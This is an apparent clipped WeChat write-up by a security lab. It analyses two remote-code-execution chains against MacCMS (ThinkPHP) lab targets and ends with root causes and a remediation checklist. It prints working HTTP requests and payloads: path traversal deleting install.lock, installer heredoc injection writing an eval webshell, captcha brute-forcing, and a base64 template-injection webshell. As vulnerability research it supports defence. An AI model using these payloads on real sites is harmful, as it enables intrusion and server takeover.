---
title: 【微信】一条链不够，就上两条： 从默认弱口令到 www-data 的 RCE 复盘
source: https://mp.weixin.qq.com/s/166SvJe6W8EMC0GQI2UiTw
source_host: mp.weixin.qq.com
clip_date: 2026-10-12T15:02:29+08:00
trace_id: 079fd3ff-3a01-43b5-86ba-cae43aa0efef
content_hash: 2b335bf655dadcde7140c5b4121918a6469b46d696241ac2eed28d4f310ea107
status: synced
tags:
  - 微信
  - 漏洞分析
  - 协议分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 同一套 MacCMS（ThinkPHP）存在两条均需默认凭据 admin/admin123 的 RCE 链，最终都得 www-data：A 靠路径遍历删 install.lock 后向导注入，B 靠验证码爆破加邮件模板 SSTI。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 3f775244-d011-8145-ab8f-caea0e3a62bd
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 同一套 MacCMS（ThinkPHP）存在两条均需默认凭据 admin/admin123 的 RCE 链，最终都得 www-data：A 靠路径遍历删 install.lock 后向导注入，B 靠验证码爆破加邮件模板 SSTI。
> 
> - **共同起点：** 两链均非零权限 RCE，前提是出厂默认管理员凭据 `admin/admin123` 未修改。
> - **链路 A（VE-0119）：** 插件 `name` 参数路径遍历（`../application/data/install`）递归删除 `install.lock`；请求虽返回 HTTP 500，但副作用已发生，访问 `/install.php` 可复活向导，step=4 用 heredoc 直接插值注入 `database` 参数写 shell，需提供可连通的真实数据库地址。
> - **链路 B（VE-0050）：** 验证码仅 4 位数字、无杂点干扰线，且 Captcha 校验失败不重置 session，故直接对 login 端点穷举 0000-9999（必须验码与登录同请求）；登录后在邮件模板写入 `{php}...{/php}`，用 base64 绕过 `htmlentities()` 对 `<>"&` 的编码，再由免登录白名单接口 `POST /index.php/user/reg_msg.html` 触发渲染落地 shell。
> - **误判提醒：** B 链返回 `code:9009 验证码发送失败`，但木马已落地，因 SMTP 连接在模板渲染之后；判断成败要看副作用而非状态码。
> - **根因与修复：** 六类问题为默认凭据、路径遍历、heredoc 危险插值、`{php}` 模板沙箱失效、验证码会话设计缺陷、免登录白名单含渲染接口；对应改用 `var_export()`、`realpath()` 前缀校验、函数白名单、验证码一次一用与频率限制、数据库非 root 及 Web 目录不可写。

**YNsec安全实验室** *2026年10月12日 14:44*

## 灵隐x星戍安全实验室技术分享

## 一条链不够，就上两条：从默认弱口令到 www-data 的 RCE 复盘

安全研究 · 漏洞利用链拆解 · 靶场实录

摘要两个靶标、两条完全不同的利用链、同一个结局。本文完整拆解这两条 RCE 链的构造思路——默认凭据如何成为起点，路径遍历与模板注入如何各显神通，并给出根因归纳与修复清单。

## 一、先把结论摆在前面

两个靶标（下文记为 **靶标 A** / **靶标 B**），跑的是同一套基于 ThinkPHP 的内容管理系统（MacCMS即苹果CMS）。最终两条链都拿到了 Web 容器用户权限：

| 靶标  | 种子漏洞 | 链类型 | 最终权限 |
| --- | --- | --- | --- |
| A   | VE-0119 安装程序代码注入 | need_account（需账号） | www-data |
| B   | VE-0050 模板引擎 SSTI | need_account（需账号） | www-data |

先说清楚一点：两条链 **都不是零权限RCE**。它们站在同一个起点上——admin / admin123 这个默认管理员凭据。

差别只在「临门一脚」怎么踢：

-   **靶标 A 的思路**
    
    ：先把安装锁删掉，让安装向导「复活」，再从向导里注入代码；
    
-   **靶标 B 的思路**
    
    ：不碰安装锁，直接在后台邮件模板里埋一段PHP，再从一个免登录接口把它点爆。
    

## 二、链路 A：删掉安装锁，让安装向导「复活」

### 2.1 起点：默认凭据直接进后台

验证码用 ddddocr 自动识别（ThinkPHP 标准 4 位验证码），凭据是系统出厂默认值：

HTTP 请求

302重定向到后台首页，拿到管理会话Cookie。 **这一步没有任何"攻击"成分，纯粹是默认配置送分。**

### 2.2 辅助漏洞：路径遍历删掉 install.lock

Addon（插件）管理模块的 `name` 参数没做路径规范化，于是可以「穿」出插件目录，指向安装锁所在目录：

HTTP 请求

POST /adm.php/addon/state HTTP/1.1  
Host: 192.0.2.10:8080  
Cookie: PHPSESSID=<admin_session>  
Content-Type: application/x-www-form-urlencoded  
  
name=../application/data/install&state=disable

触发路径长这样：

漏洞触发链

Addon::state()  
└─ name =../application/data/install  
└─ Service::disable()  
└─ is_dir(ADDON_PATH. name)  
\= is_dir('/var/www/html/addons/../application/data/install')  
\= is_dir('/var/www/html/application/data/install') ✓ 是目录  
└─ rmdirs('/var/www/html/application/data/install/')  
└─ install.lock 被递归删除

⚠️ 有意思的细节：这一请求的响应是 **HTTP 500** （后续写插件信息失败），但 `install.lock` **已经被删掉了**。看错误码判断成败，在这里会误判——要看「副作用」是否已经发生。

此时访问 `/install.php` ，安装界面重新出现。

### 2.3 临门一脚：安装向导的代码注入

安装向导第 4 步要收集数据库连接信息，并把它们写进 `database.php` 。问题在于写文件用的是 heredoc **直接插值**，而没有做转义：

HTTP 请求

POST /install.php?step=4 HTTP/1.1  
Host: 192.0.2.10:8080  
Content-Type: application/x-www-form-urlencoded  
  
hostname=172.19.0.3&hostport=3306&username=root&password=root  
&database=x'.file_put_contents('/var/www/html/shell_a.php','<?php @eval($\_POST\[1\]);?>').'x  
&prefix=mac\_&cover=1

注意 `database` 参数的两侧那两个 `x` 和单引号——它们负责把闭合引号，让插值进去的内容从「字符串」变成「可执行代码」。执行链如下：

漏洞触发链

install.php → step=4  
└─ $data\['database'\] = "x'.file_put_contents(...).'x"  
└─ $database = $data\['database'\] ← 暂存  
└─ unset($data\['database'\]) ← 先用真实库名连接 MySQL  
└─ Db::connect($data) ✓ 连接成功  
└─ $data\['database'\] = $database ← 再恢复  
└─ mkDatabase($data)  
└─ heredoc: 'database' => '{$data\['database'\]}',  
└─ file_put_contents(APP_PATH.'database.php', $code)  
└─ include APP_PATH.'database.php'  
└─ 注入的 file_put_contents() 被执行  
└─ 写入 /var/www/html/shell_a.php

💡 这条链最值得学的，是「**先连接、后写入**」的时序：攻击者必须提供一个能连上的真数据库地址，才能走到写文件那一步。如果目标是内网隔离或数据库密码随机，这条链会直接卡死在第一步。

### 2.4 验证：一条命令确认 RCE

HTTP 请求

POST /shell_a.php HTTP/1.1  
Host: 192.0.2.10:8080  
Content-Type: application/x-www-form-urlencoded  
  
1=system('id');

响应

uid=33(www-data) gid=33(www-data) groups=33(www-data)

为排除误报，研究者还做了「两次独立随机标记写入」的双重验证：一个标记写进 `/tmp` 用 webshell 读回，另一个写进 Web 目录用 HTTP 直连读取，两条路径都精确匹配 —— **确认不是回显假象**。

## 三、链路 B：不删锁，从模板引擎里埋刀

链路 B 的靶标上， `install.lock` 存在、安装页走不通。于是换条路： **直接拿后台的模板配置当代码执行入口**。

### 3.1 第一步：把验证码爆破掉

靶机的验证码配置相当「友好」：

application/extra/captcha.php

return \[  
'codeSet' => '1234567890', // 仅数字  
'length' => 4, // 4 位  
'useNoise' => false, // 无杂点  
'useCurve' => false, // 无干扰线  
\];

而 ThinkPHP Captcha 的 `check()` 有个致命设定： **校验失败时不重置 session里的验证码值，只有成功才删**。这意味着同一个验证码可以在同一会话里被穷举 10000 次：

爆破思路

\# 失败不重置 session → 单个验证码可穷举 0000-9999  
for code in range(10000):  
POST /adm.php/admin/index/login.html  
admin_name=admin&admin_pwd=admin123&verify={code}  
if '"code":1' in resp: # 验证码正确 + 登录成功  
break  
  
\# 实测命中：7713（每次随机，平均约 5000 次）

⚠️ 一个容易踩的坑： `/verify/check` 端点在 **验证成功后** 会重置 session。所以不能「先爆破验证码再登录」，而要 **直接对 login 端点穷举**，一次请求同时完成「验码 + 登录」。

登录请求与响应：

HTTP 请求

响应

### 3.2 第二步：把 PHP 注入邮件模板

后台「邮件配置」页允许自定义邮件模板正文。模板引擎在编译时会处理 `{php}...{/php}` 标签，而 `parseVarFunction()` 只维护了一份很小的黑名单（仅 `echo, exit` ）。于是载荷长这样：

注入载荷（写入 email\[tpl\]\[user_reg_body\]）

{php}file_put_contents('/var/www/html/shell_b.php',  
base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+'));  
{/php}

💡 为什么用 base64？因为 `htmlentities()` 会编码 `< > " &` ，但 **不拦** `{ } $ | =` 。把 PHP 代码 base64 之后，载荷里就只剩模板语法字符，绕过了编码过滤。解码后是 `<?php system($_GET["cmd"]); ?>` 。

保存模板的请求（需先取 CSRF token）：

HTTP 请求

POST /adm.php/admin/system/configemail.html HTTP/1.1  
X-Requested-With: XMLHttpRequest  
Content-Type: application/x-www-form-urlencoded  
  
\__token\_\_=<csrf>&email\[time\]=5  
&email\[tpl\]\[user_reg_body\]=reg body {php}file_put_contents(...);{/php}  
&email\[phpmailer\]\[host\]=smtp.qq.com&...

### 3.3 第三步：从一个「无需登录」的接口点爆

模板写好了，但需要有人「渲染」它。研究者找到了 `/index.php/user/reg_msg.html` —— 它被放进了 `guestAllowedActions` 免登录白名单，任何人可访问：

漏洞触发链

POST /index.php/user/reg_msg.html ← 免登录白名单  
└─ User::reg_msg() → User::send_msg()  
└─ 读取 $GLOBALS\['config'\]\['email'\]\['tpl'\]  
└─ View::instance()->display($msg)  
└─ Template::compiler() → parseTagLib('cx')  
└─ {php}…{/php} → <?php …?>  
└─ include($cacheFile) ← 编译结果被包含执行  
└─ file_put_contents('/var/www/html/shell_b.php',...)

HTTP 请求

POST /index.php/user/reg_msg.html HTTP/1.1  
Content-Type: application/x-www-form-urlencoded  
  
ac=email&to=test@test.com

响应（报错但不影响）

{"code":9009,"msg":"验证码发送失败：未配置邮箱发送服务"}

⚠️ 这里返回的是「发送失败」，但 **木马已经落地**。因为 SMTP 连接发生在 **模板渲染（代码执行）之后**。很多人看到报错就放弃了 —— 记住一句话： **错误信息描述的是业务流程，不是代码执行的成败。**

### 3.4 验证

HTTP 请求

GET /shell_b.php?cmd=id HTTP/1.1  
Host: 192.0.2.20:8080

响应

uid=33(www-data) gid=33(www-data) groups=33(www-data)

环境信息： `PHP 7.4.33` + `Apache/2.4.54` ，Web 根目录 `/var/www/html` 。

## 四、两条链放在一起看

| 对比项 | 链路 A（VE-0119） | 链路 B（VE-0050） |
| --- | --- | --- |
| 入口  | 默认凭据 `admin/admin123` | 验证码穷举 + 同一默认凭据 |
| 关键辅助 | 路径遍历删除 install.lock | Captcha 校验失败不重置会话 |
| 注入点 | 安装向导 heredoc 插值 | 后台邮件模板 `{php}` 标签 |
| 触发方式 | 访问安装页 step=4（需先解锁） | POST 免登录接口 reg_msg |
| 是否需要删锁 | 是   | 否   |
| 落点  | Web 目录写入 PHP 木马 | Web 目录写入 PHP 木马 |
| 最终权限 | www-data | www-data |

💡 **一个关键观察**：链路 B 的「注入」在后台（需管理员），但「触发」在 **免登录接口** 上。也就是说，只要攻击者拿到过一次后台权限（哪怕只是短暂登录），就能埋下一颗 **不需要任何权限就能引爆** 的雷。这类「存储型 + 未授权触发」的组合，比单纯的越权危险得多。

## 五、根因归纳：六类问题，串成一条链

把两条链的每个环节拆开，会发现问题集中在六类：

| 根因  | 具体表现 |
| --- | --- |
| 1\. 默认凭据 | 出厂口令 `admin/admin123` 未强制修改 |
| 2\. 路径遍历 | Addon 的 `name` 参数未做 realpath / 前缀校验 |
| 3\. 危险插值 | 配置写文件用 heredoc 直接插值，未用 `var_export()` |
| 4\. 模板沙箱失效 | `{php}`<br><br>标签未禁用，函数过滤只有黑名单 |
| 5\. 会话/验证码设计 | 校验失败不重置 + 无频率限制 + 复杂度可关 |
| 6\. 权限边界混乱 | 含模板渲染能力的接口被列入免登录白名单；应用以 root 连库；Web 目录可写 |

单独看，每一条都算不上「惊天大洞」。但安全就是这样： **一个个「小问题」串起来，就是一条完整的 RCE。**

## 六、修复清单：按优先级照做

立即处理（今天就能做）

1.  修改所有默认管理员口令，禁用弱口令并强制复杂度；
    
2.  安装完成后 **保留 install.lock**；更彻底的做法是安装完直接 **删除整个 install 目录**；
    
3.  检查是否已有异常文件落地（Web 目录下的可疑 PHP、 `database.php` 是否被改动）；
    
4.  确认4位纯数字验证码已更换为字母+数字混合，并开启干扰线与杂点。
    

代码层修复

1.  **路径遍历**
    
    ：Addon 控制器对 `name` 做 `realpath()` 规范化，并强制校验结果必须落在插件目录前缀内，禁止 `..` 序列；
    
2.  **配置写入**
    
    ：改用 `var_export()` 替代 heredoc 插值，写入后校验文件内容完整性；
    
3.  **模板引擎**
    
    ：关闭 `{php}` 标签， `parseVarFunction()` 改为 **白名单** （仅放行 `date / strtotime / md5` 等安全函数）；对邮件模板内容做模板语法正则拦截；
    
4.  **验证码**
    
    ： `Captcha::check()` 在失败时也删除 session 中的验证码值（一次一用）；登录接口加 IP 频率限制（如每分钟 ≤10 次）。
    

权限与架构层加固

1.  把 `reg_msg` 等含模板渲染能力的接口移出免登录白名单；敏感操作加二次确认；
    
2.  数据库连接账号 **不用 root**，按最小权限授权；
    
3.  Web目录文件权限最小化（配置文件设只读），容器内避免用可写 Web 目录承载应用代码；
    
4.  为邮件模板等敏感配置变更增加审计日志，便于事后回溯。
    

## 写在最后

这两条链最值得记住的，其实不是某个具体 payload，而是三点思路：

1.  **默认配置就是第一攻击面。**
    
    出厂口令、可关闭的验证码、保留的安装目录，任何一项单独看都「无所谓」，叠起来就是门户洞开。
    
2.  **别用状态码判断成败。**
    
    500 不代表没成功，9009 也不代表没执行 —— 要看副作用是否已经发生。
    
3.  **「存储型 + 未授权触发」是最危险的组合。**
    
    一次短暂的后台权限，就能换来一颗永远不用权限即可引爆的雷。
    

防御的思路也就清楚了： **把链条上的任意一环掐断，整条链就断了。** 而最容易、收益最高的一环，永远是——先把默认口令改掉。

觉得有收获？

点个「在看」和「赞」，把这篇转给还在用默认口令的同事 👇  
下一期我们拆「zencart」。
